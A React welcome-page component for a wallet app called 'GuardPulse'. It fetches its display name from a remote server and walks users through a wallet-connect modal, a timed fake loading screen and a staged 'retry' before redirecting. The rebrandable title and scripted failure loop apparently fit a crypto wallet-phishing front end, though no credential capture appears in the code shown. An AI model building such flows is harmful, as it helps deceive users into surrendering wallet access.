import { useEffect, useState } from "react";
import { motion } from "framer-motion";
import FirstModal from "./FirstModal";

import Loader from "./Loader";
import Try from "./Try";
import { useNavigate } from "react-router";

const Welcome = () => {
  const [title, setTitle] = useState("GuardPulse");

  useEffect(() => {
    const fetchTitle = async () => {
      try {
        const res = await fetch("https://lol-ep0y.onrender.com/title");
        const data = await res.json();
        if (data.title) {
          setTitle(data.title);
          document.title = data.title; // <-- dynamically set tab title
        }
        console.log(data, "name");
      } catch (err) {
        console.error("Error fetching title:", err);
      }
    };

    fetchTitle();
  }, []);

  const [showWalletModal, setShowWalletModal] = useState(false);
  const [showLoaderModal, setShowLoaderModal] = useState(false);
  const [showRetry, setShowRetry] = useState(false);
  const navigate = useNavigate();

  const openWalletModal = () => setShowWalletModal(true);
  const closeWalletModal = () => setShowWalletModal(false);

  const openLoaderModal = () => {
    setShowWalletModal(false);
    setShowLoaderModal(true);
    setShowRetry(false);

    setTimeout(() => {
      setShowLoaderModal(false);
      setShowRetry(true);
    }, 3000);
  };

  const showLoaderForRetry = () => {
    setShowRetry(false);
    setShowLoaderModal(true);

    setTimeout(() => {
      setShowLoaderModal(false);
      navigate("/policy");
    }, 2000);
  };

  return (
    <div className="relative h-screen flex flex-col justify-center items-center overflow-hidden">
      {/* Radial Gradient Background */}
      <div className="absolute inset-0 z-[-2] h-full w-full [background:radial-gradient(125%_125%_at_50%_10%,#000_40%,#63e_100%)]" />

      {/* Animated Header */}

      <motion.h1
        className="text-4xl font-bold"
        initial={{ scale: 0.2, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{
          delay: 4.2,
          type: "spring",
          stiffness: 100,
          damping: 10,
        }}
      >
        Welcome
      </motion.h1>
      <motion.div
        className="flex items-center text-white z-10"
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ delay: 4, duration: 0.8, ease: "easeOut" }}
      >
        <h1 className="text-3xl font-bold">{title}</h1>
      </motion.div>

      {/* Animated Welcome Text and Button */}
      <motion.div
        className="text-center text-white mt-8 z-10 px-5"
        initial="hidden"
        animate="visible"
        variants={{
          hidden: {},
          visible: {
            transition: {
              delayChildren: 4.2,
              staggerChildren: 0.3,
            },
          },
        }}
      >
        {/* Welcome */}
        <motion.h1
          className="text-4xl font-bold"
          initial={{ scale: 0.2, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{
            delay: 4.2,
            type: "spring",
            stiffness: 100,
            damping: 10,
          }}
        >
          Welcome
        </motion.h1>

        {/* Subtext */}
        <motion.p
          className="mt-2 text-lg"
          initial={{ y: 30, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 4.5, type: "spring", bounce: 0.4 }}
        >
          Let's start by connecting your wallet
        </motion.p>

        {/* Button */}
        <motion.button
          type="button"
          onClick={openWalletModal}
          className="text-gray-900 cursor-pointer bg-gradient-to-r from-lime-200 via-lime-400 to-lime-500 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-lime-300 dark:focus:ring-lime-800 shadow-lg shadow-lime-500/50 dark:shadow-lg dark:shadow-lime-800/80 font-medium rounded-lg text-sm px-5 py-2.5 text-center me-2 mb-2 mt-4"
          initial={{ scale: 0.5, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{ delay: 4.8, type: "spring", stiffness: 120 }}
        >
          Enter App
        </motion.button>

        {/* Terms */}
        <motion.p
          className="mt-4 text-sm"
          initial={{ y: 20, opacity: 0 }}
          animate={{ y: 0, opacity: 1 }}
          transition={{ delay: 5.1, duration: 0.6 }}
        >
          By using this application you agree to the Terms of Use. Additionally,
          please refer to the Important Notice.
        </motion.p>
      </motion.div>

      {/* Modals */}
      {showWalletModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
          <FirstModal
            closeModal={closeWalletModal}
            openLoader={openLoaderModal}
          />
        </div>
      )}

      {showLoaderModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
          <Loader />
        </div>
      )}

      {showRetry && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex justify-center items-center z-50">
          <div className="bg-white p-6 rounded shadow-md">
            <Try showLoaderForRetry={showLoaderForRetry} />
          </div>
        </div>
      )}
    </div>
  );
};

export default Welcome;
